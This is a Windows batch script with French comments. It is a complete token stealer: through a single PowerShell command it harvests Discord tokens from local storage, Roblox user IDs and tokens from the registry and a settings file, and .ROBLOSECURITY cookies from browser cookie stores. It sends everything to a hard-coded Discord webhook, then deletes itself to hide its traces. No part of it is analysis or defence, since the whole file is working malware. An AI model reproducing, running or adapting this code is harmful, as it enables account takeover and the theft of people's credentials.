@echo off
:: PALOFSC - EXFILTRATION COMPLETE EN UNE SEULE COMMANDE POWERSHELL
set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$w='%WEBHOOK%';" ^
"$p=@($env:APPDATA+'\Discord\Local Storage\leveldb',$env:APPDATA+'\discordptb\Local Storage\leveldb',$env:APPDATA+'\discordcanary\Local Storage\leveldb');" ^
"$t=@(); $pat='[a-zA-Z0-9_\-]{20,80}\.[a-zA-Z0-9_\-]{6,30}\.[a-zA-Z0-9_\-]{20,100}';" ^
"foreach($d in $p){if(Test-Path $d){Get-ChildItem $d -File -ErrorAction SilentlyContinue|ForEach-Object{Select-String -Path $_.FullName -Pattern $pat -AllMatches -ErrorAction SilentlyContinue|ForEach-Object{$_.Matches.Value}}|ForEach-Object{$t+=$_}}};" ^
"$t=$t|Select-Object -Unique; $disc=$t -join ' ';" ^
"$u=$null;$r=$null;try{$u=(Get-ItemProperty 'HKCU:\Software\Roblox\RobloxStudio' -Name UserID -ErrorAction SilentlyContinue).UserID}catch{};" ^
"try{$r=(Get-ItemProperty 'HKCU:\Software\Roblox\RobloxStudio' -Name RememberMe -ErrorAction SilentlyContinue).RememberMe}catch{};" ^
"$xml=$null;$xp=$env:LOCALAPPDATA+'\Roblox\GlobalBasicSettings_13.xml';if(Test-Path $xp){try{$x=[xml](Get-Content $xp -ErrorAction SilentlyContinue);if($x.settings.token){$xml=$x.settings.token}}catch{}};" ^
"$ck=$null;$cf=@($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Cookies',$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default\Cookies',$env:APPDATA+'\Microsoft\Windows\Cookies\*.txt',$env:LOCALAPPDATA+'\Microsoft\Windows\INetCookies\*.txt');" ^
"foreach($f in $cf){if(Test-Path $f){$m=Select-String -Path $f -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -AllMatches -ErrorAction SilentlyContinue;if($m){$ck=($m.Matches.Value -replace 'ROBLOSECURITY=','');if($ck.Length -gt 30){break}}}};" ^
"$msg='';if($disc){$msg+='=== TOKENS DISCORD ===`n'+$disc+'`n`n'};" ^
"if($u){$msg+='=== ROBLOX UserID ===`n'+$u+'`n`n'};" ^
"if($r){$msg+='=== ROBLOX RememberMe ===`n'+$r+'`n`n'};" ^
"if($xml){$msg+='=== ROBLOX Token XML ===`n'+$xml+'`n`n'};" ^
"if($ck){$msg+='=== ROBLOX Cookie .ROBLOSECURITY ===`n'+$ck+'`n`n'};" ^
"if(!$msg){$msg='Aucune donnee collectee.'};" ^
"$payload=@{content=$msg}|ConvertTo-Json -Compress;" ^
"try{Invoke-RestMethod -Uri $w -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop;Write-Output 'OK'}catch{Write-Output ('ERREUR:'+$_.Exception.Message)}"

:: Auto-suppression du script
del /f /q "%~f0" >nul 2>&1
exit /b 0
